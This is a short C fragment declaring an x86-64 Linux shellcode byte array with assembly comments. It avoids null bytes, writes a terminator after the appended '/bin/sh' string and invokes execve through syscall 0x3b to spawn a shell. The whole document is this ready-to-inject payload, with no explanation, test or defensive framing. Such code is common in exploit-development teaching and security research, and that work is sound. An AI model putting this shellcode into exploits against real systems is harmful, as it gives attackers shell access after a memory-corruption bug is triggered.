static char shellcode[] =
    "\x48\x31\xc0"                  /* xor rax, rax */
    "\x50"                          /* push rax */
    "\x48\x8d\x3d\x22\x01\x01\x01"  /* lea rdi,[rip + 0x101010122] */
    "\x48\x81\xef\x01\x01\x01\x01"  /* sub rdi, 0x101010101 */
    "\x57"                          /* push rdi */
    "\x48\x89\xe6"                  /* mov rsi, rsp */
    "\x48\x31\xd2"                  /* xor rdx, rdx */

    "\x48\x89\xf8"                  /* mov rax, rdi */
    "\x48\x83\xc0\x07"              /* add rax, 0x7 */
    "\x48\x31\xdb"                  /* xor rbx, rbx */
    "\x88\x18"                      /* mov [rax], bl */

    "\x48\x31\xc0"                  /* xor rax, rax */
    "\xb0\x3b"                      /* mov al, 0x3b */
    "\x0f\x05"                      /* syscall */
    "/bin/sh";
